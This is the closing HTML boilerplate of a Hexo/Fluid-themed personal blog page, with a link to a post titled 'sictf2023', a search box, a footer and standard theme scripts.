                    
                    
                      <a href="/2023/09/10/sictf2023/" title="sictf2023">
                        <span class="hidden-mobile">sictf2023</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
    </div>
  
  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      京ICP证123456号
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>京公网安备12345678号</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
